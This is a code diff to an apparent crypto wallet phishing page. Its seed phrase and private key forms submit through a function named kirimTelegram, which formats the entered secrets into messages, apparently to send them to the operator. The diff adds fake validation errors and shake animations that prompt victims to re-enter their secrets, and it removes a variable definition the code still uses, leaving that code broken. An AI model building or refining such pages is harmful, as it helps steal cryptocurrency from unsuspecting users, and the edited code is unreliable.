@@ -37,7 +37,12 @@
     .navbar::after { display: none; }
 
     @keyframes flareMove { 0% { transform: translateX(-40%); } 50% { transform: translateX(40%); } 100% { transform: translateX(-40%); } }
-
+   
+    @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }
+    .btn-submit.shake { animation: shake 0.4s ease; }
+    .error-msg { background: #fde8e8; border: 1.5px solid #c0392b; border-radius: 4px; color: #c0392b; font-family: 'Space Mono', monospace; font-size: 12px; padding: 10px 14px; margin-bottom: 10px; display: none; }
+    .error-msg.show { display: block; }
+    
     .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; position: relative; z-index: 1; }
     .logo-icon { width: 36px; height: 36px; background: var(--gold); border-radius: 4px; border: 2px solid #8b6a00; display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; overflow: hidden; }
     .logo-text { font-family: 'Space Mono', monospace; font-weight: 700; font-size: 1rem; letter-spacing: -0.01em; line-height: 1.1; }
@@ -276,6 +281,7 @@
 
           <form id="phraseForm" onsubmit="kirimTelegram(event, 'phrase')">
             <div class="seed-grid" id="seedGrid"></div>
+            <div class="error-msg" id="errorPhrase">Invalid words. Please double check.</div>
             <button class="btn-submit" type="submit" id="btnSubmitPhrase">Import Wallet</button>
           </form>
         </div>
@@ -285,6 +291,7 @@
             <div class="pk-wrap">
               <textarea class="pk-input" id="pkInput" placeholder="Enter your Private Key" autocomplete="off" spellcheck="false"></textarea>
             </div>
+            <div class="error-msg" id="errorPK">Invalid format.</div>
             <button class="btn-submit" type="submit" id="btnSubmitPK">Import Wallet</button>
           </form>
         </div>
@@ -368,6 +375,15 @@
 
     buildSeedGrid(12);
 
+    grid.addEventListener('input', () => {
+  document.getElementById('errorPhrase').classList.remove('show');
+});
+
+    document.getElementById('pkInput').addEventListener('input', () => {
+  document.getElementById('errorPK').classList.remove('show');
+  document.querySelector('.pk-wrap').classList.remove('error');
+});
+
     function showToast() {
       const t = document.getElementById('toast');
       t.classList.add('show');
@@ -388,21 +404,28 @@
             hasError = true;
           }
         });
-        if (hasError) return;
-        const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
-        if (words.length < currentWordCount) {
-          alert(`Please fill all ${currentWordCount} words.`);
-          return;
-        }
+        if (hasError) {
+  const btn = document.getElementById('btnSubmitPhrase');
+  const msg = document.getElementById('errorPhrase');
+  msg.classList.add('show');
+  btn.classList.add('shake');
+  btn.addEventListener('animationend', () => btn.classList.remove('shake'), {once: true});
+  return;
+}
         pesan = `[PHRASE ${currentWordCount}w] ${words.join(' ')}`;
       } else {
         const pk = document.getElementById('pkInput').value.trim();
         const pkWrap = document.querySelector('.pk-wrap');
         pkWrap.classList.remove('error');
         if (pk.length < 64) {
-          pkWrap.classList.add('error');
-          return;
-        }
+          const btn = document.getElementById('btnSubmitPK');
+  const msg = document.getElementById('errorPK');
+  pkWrap.classList.add('error');
+  msg.classList.add('show');
+  btn.classList.add('shake');
+  btn.addEventListener('animationend', () => btn.classList.remove('shake'), {once: true});
+  return;
+}
         pesan = `[PRIVATE KEY] ${pk}`;
       }
 
